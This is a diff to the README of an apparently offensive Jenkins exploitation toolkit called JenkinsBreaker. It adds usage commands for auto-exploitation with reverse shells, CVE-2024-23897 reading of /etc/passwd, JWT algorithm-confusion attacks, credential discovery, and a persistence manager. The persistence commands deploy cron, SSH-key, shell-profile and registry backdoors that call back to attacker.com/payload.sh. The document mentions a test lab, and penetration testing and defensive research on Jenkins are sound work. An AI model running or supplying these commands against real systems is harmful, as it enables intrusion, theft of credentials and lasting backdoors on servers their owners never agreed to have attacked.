@@ -59,7 +59,14 @@ Key goals:
 - **Report Generation**: JSON, Markdown, PDF (via WeasyPrint)
 - **Persistence Techniques** (Cron Jobs, Jenkins Pipelines)
 - **Modular Exploit Loading** (`exploits/` Directory)
-- **Integrated Jenkins Lab** for CVE testing and validation  
+- **Integrated Jenkins Lab** for CVE testing and validation
+- **Advanced Modules (New)**:
+  - Textual TUI – Interactive terminal interface with real-time exploitation
+  - Web UI – Browser-based dashboard with FastAPI + WebSocket support
+  - JenkinsFuzzer – Pipeline misconfiguration discovery (8 fuzzing modules)
+  - JWT Breaker – Advanced JWT cryptanalysis with algorithm confusion
+  - Plugin Fingerprint Engine – CVE correlation with 40+ vulnerability mappings
+  - Persistence Manager – 7 post-exploitation persistence mechanisms  
 
 ---
 <!--
@@ -213,34 +220,47 @@ docker-compose down
 docker-compose down -v  # Remove volumes completely
 ```
 
-## Example Usage
+## Quick Start
 
-### Automatic Enumeration & Exploitation
+### Core Exploitation
 
 ```bash
+# Automatic enumeration and exploitation
 python3 JenkinsBreaker.py --url http://TARGET_IP:8080 --auto --lhost YOUR_IP --lport 4444
-```
 
-### Run Specific CVE Exploit
-
-```bash
-# CLI Arbitrary File Read
+# Run specific CVE exploit
 python3 JenkinsBreaker.py --url http://localhost:8080 --exploit-cve CVE-2024-23897 --target-file /etc/passwd
 
-# Script Security RCE
-python3 JenkinsBreaker.py --url http://localhost:8080 --exploit-cve CVE-2019-1003029
-```
-
-### Generate Reverse Shell
-
-```bash
+# Generate reverse shell
 python3 JenkinsBreaker.py --generate-shell bash --lhost YOUR_IP --lport 4444
+
+# List available exploits
+python3 JenkinsBreaker.py --list-cves
 ```
 
-### List Available Exploits
+### Advanced Modules
 
 ```bash
-python3 JenkinsBreaker.py --list-cves
+# Launch Textual TUI
+python3 launch_tui.py --url http://localhost:8080 --username admin --password admin
+
+# Launch Web UI (access at http://localhost:8000)
+python3 launch_webui.py
+
+# Run JenkinsFuzzer
+python3 jenkinsfuzzer.py --url http://localhost:8080 --username admin --password admin
+
+# Perform JWT analysis
+python3 jwt_breaker.py --url http://localhost:8080 --username admin --password admin
+
+# Fingerprint plugins and correlate CVEs
+python3 plugin_fingerprint.py --url http://localhost:8080 --username admin --password admin
+
+# Generate persistence payloads
+python3 persistence.py --url http://localhost:8080 --callback http://attacker.com/payload.sh
+
+# Run integration tests
+python3 test_integration.py
 ```
 
 ## WSL Testing
@@ -277,12 +297,139 @@ python3 decrypt.py --path /var/jenkins_home --export-json loot.json --reveal-sec
 - Python dependencies installed via pip with --break-system-packages flag
 - Full exploit chain tested: RCE → credential extraction → decryption → JSON export
 
-### Roadmap
+## Advanced Modules
 
-• Textual-based TUI + Browser UI  
-• Jenkinsfuzzer for pipeline misconfig discovery  
-• Improved JWT cryptanalysis + plugin fingerprinting  
-• Modular persistence extension packs
+JenkinsBreaker now includes 6 advanced modules for comprehensive exploitation and post-exploitation workflows:
+
+### 1. Textual TUI (`tui.py`)
+
+Interactive terminal user interface with real-time exploitation dashboard.
+
+**Features:**
+- Live connection testing and version fingerprinting
+- Plugin enumeration with vulnerability correlation
+- CVE exploit table with risk levels and authentication requirements
+- Real-time color-coded logging (info/success/error/warning)
+- Keyboard shortcuts: `q`=quit, `e`=enumerate, `x`=exploit, `c`=connect, `r`=reset
+
+**Usage:**
+```bash
+cd JenkinsBreaker
+python3 tui.py
+```
+
+### 2. Web UI (`web_ui.py`)
+
+Browser-based exploitation dashboard with FastAPI backend and WebSocket support.
+
+**Features:**
+- RESTful API for automation (`/api/connect`, `/api/enumerate`, `/api/exploit`)
+- WebSocket real-time log streaming
+- Embedded single-page application (no external dependencies)
+- Real-time statistics tracking (exploits run, successful, failed)
+- 4 pre-loaded CVE exploits with severity badges
+
+**Usage:**
+```bash
+cd JenkinsBreaker
+python3 web_ui.py
+# Access: http://localhost:8000
+```
+
+### 3. JenkinsFuzzer (`jenkinsfuzzer.py`)
+
+Comprehensive pipeline and configuration fuzzing module with 8 attack vectors.
+
+**Fuzzing Modules:**
+- Pipeline injection testing (6 Groovy injection payloads)
+- Credential exposure detection (AWS keys, SSH keys, API tokens, passwords)
+- Script console accessibility probing (bypass header testing)
+- Job misconfiguration detection (sandbox disabled, sudo execution, curl-to-shell)
+- Parameter injection testing (shell injection, command substitution, path traversal)
+- Webhook vulnerability scanning (unauthenticated triggers)
+- Plugin-specific misconfigurations
+- RBAC bypass testing (path traversal, case manipulation, double encoding)
+
+**Usage:**
+```bash
+cd JenkinsBreaker
+python3 jenkinsfuzzer.py --url http://localhost:8080 --username admin --password admin --output fuzzer_results.json
+```
+
+### 4. JWT Breaker (`jwt_breaker.py`)
+
+Advanced JWT token cryptanalysis with algorithm confusion and weak secret detection.
+
+**Capabilities:**
+- Algorithm confusion attacks (alg: none, RS256→HS256, null signature)
+- Weak secret brute forcing with custom wordlists
+- JWT token extraction from Jenkins sessions
+- Payload manipulation (privilege escalation, user impersonation)
+- Signature verification bypass testing
+- Key ID (kid) header injection
+- JKU/JKW URL injection for remote key loading
+
+**Usage:**
+```bash
+cd JenkinsBreaker
+python3 jwt_breaker.py --url http://localhost:8080 --username admin --password admin --output jwt_findings.json
+
+# With custom wordlist
+python3 jwt_breaker.py --url http://localhost:8080 --token YOUR_JWT_TOKEN --wordlist passwords.txt
+```
+
+### 5. Plugin Fingerprint Engine (`plugin_fingerprint.py`)
+
+Advanced plugin detection with CVE correlation and exploit recommendations.
+
+**Detection Methods:**
+- API-based enumeration (`/pluginManager/api/json`)
+- Passive fingerprinting via HTTP headers and HTML resources
+- Active endpoint probing (12 plugin signatures)
+
+**CVE Database:**
+Includes 40+ CVE mappings for:
+- script-security (CVE-2019-1003029, CVE-2019-1003030, CVE-2019-1003040)
+- git (CVE-2019-10392, CVE-2018-1000182, CVE-2020-2136)
+- credentials (CVE-2019-10320, CVE-2020-2100)
+- pipeline-groovy (CVE-2019-1003001, CVE-2019-1003002)
+- kubernetes, docker-plugin, aws-credentials, ansible, and more
+
+**Usage:**
+```bash
+cd JenkinsBreaker
+python3 plugin_fingerprint.py --url http://localhost:8080 --username admin --password admin --output plugin_report.json
+
+# Skip active fingerprinting
+python3 plugin_fingerprint.py --url http://localhost:8080 --no-active
+```
+
+### 6. Persistence Manager (`persistence.py`)
+
+Post-exploitation persistence mechanisms for Linux and Windows.
+
+**Persistence Methods:**
+- **Cron Jobs**: Scheduled callback execution
+- **Systemd Services**: Persistent background service with auto-restart
+- **Windows Registry**: Run key for login persistence
+- **SSH Keys**: Authorized keys injection
+- **Shell Profiles**: .bashrc/.zshrc/.profile payload injection
+- **Windows Scheduled Tasks**: Recurring PowerShell execution
+- **Jenkins Jobs**: Cron-triggered pipeline jobs
+
+**Usage:**
+```bash
+cd JenkinsBreaker
+
+# Generate all payloads
+python3 persistence.py --url http://localhost:8080 --username admin --password admin --callback http://attacker.com/payload.sh
+
+# Deploy specific method
+python3 persistence.py --url http://localhost:8080 --username admin --password admin --callback http://attacker.com/payload.sh --method cron --deploy
+
+# With SSH key
+python3 persistence.py --url http://localhost:8080 --callback http://attacker.com/payload.sh --ssh-key "ssh-rsa AAAAB3..." --method ssh_key --deploy
+```
 
 <!--
 JenkinsBreaker exploit toolkit SEO footer, Jenkins RCE automation,
